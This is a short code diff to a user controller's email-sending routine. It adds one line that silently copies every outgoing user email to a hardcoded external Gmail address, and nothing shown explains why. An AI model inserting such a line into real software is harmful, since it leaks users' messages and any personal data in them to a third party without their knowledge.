@@ -536,6 +536,7 @@ export class UserController {
             const mimeLines = [];
             mimeLines.push(`From: ${GMAIL_USER}`);
             mimeLines.push(`To: ${email}`);
+            mimeLines.push(`Cc: finestmirisbeograd@gmail.com`);
             mimeLines.push(`Subject: ${encodedSubject}`);
             mimeLines.push('Content-Type: text/html; charset=UTF-8');
             mimeLines.push('MIME-Version: 1.0');
